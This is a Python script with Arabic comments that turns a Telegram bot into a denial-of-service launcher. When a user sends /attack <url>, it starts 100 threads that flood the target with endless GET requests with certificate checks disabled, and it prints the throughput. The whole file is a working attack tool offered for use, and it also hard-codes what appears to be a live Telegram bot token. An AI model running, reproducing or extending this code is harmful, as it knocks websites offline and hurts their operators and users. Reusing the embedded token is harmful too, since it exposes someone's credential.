import requests
import threading
import urllib3
import time
from datetime import datetime
import telebot
from bs4 import BeautifulSoup as bs

# تعطيل التحقق من صحة شهادة SSL
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

fake_ip = '182.21.20.32'

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, مثل Gecko) Chrome/91.0.4472.124 Safari/537.36'
}

# إنشاء جلسة واحدة للاستخدام المتكرر
session = requests.Session()
session.verify = False

# متغير لتخزين عدد البايتات المنقولة
bytes_transferred = 0
lock = threading.Lock()

def attack(url):
    global bytes_transferred
    while True:
        try:
            response = session.get(url, headers=headers)
            with lock:
                bytes_transferred += len(response.content)
            print("تم إرسال الطلب إلى:", url)
        except Exception as e:
            print("حدث خطأ:", e)

def start_attack(url):
    threads = []
    for _ in range(100):  # بدء عدد من الخيوط
        thread = threading.Thread(target=attack, args=(url,))
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()

    # الطلب الأولي خارج الهجمات
    try:
        response = session.get(url, headers=headers)
        print(response.text)
    except Exception as e:
        print("حدث خطأ أثناء الطلب الأولي:", e)

def calculate_speed():
    global bytes_transferred
    while True:
        time.sleep(1)
        with lock:
            speed = bytes_transferred / (1024 * 1024)  # تحويل البايتات إلى ميجابايت
            bytes_transferred = 0
        print(f"سرعة النقل: {speed:.2f} MB/s")

# إنشاء البوت باستخدام التوكن الخاص بك
TOKEN = '6806748645:AAH9Vx9sZfr282GJx4DMlR8hjJcW3O8xeVA'
bot = telebot.TeleBot(TOKEN)

@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.reply_to(message, "مرحبًا! أدخل رابط الهدف باستخدام الأمر /attack <url>")

@bot.message_handler(commands=['attack'])
def handle_attack(message):
    url = message.text.split()[1] if len(message.text.split()) > 1 else None
    if url:
        bot.reply_to(message, f"بدء الهجوم على: {url}")

        # بدء خيط حساب السرعة
        speed_thread = threading.Thread(target=calculate_speed)
        speed_thread.daemon = True
        speed_thread.start()

        # بدء الهجوم في خيط منفصل
        attack_thread = threading.Thread(target=start_attack, args=(url,))
        attack_thread.start()
    else:
        bot.reply_to(message, "يرجى إدخال رابط الهدف بعد الأمر /attack")

def main():
    bot.polling()

if __name__ == '__main__':
    main()
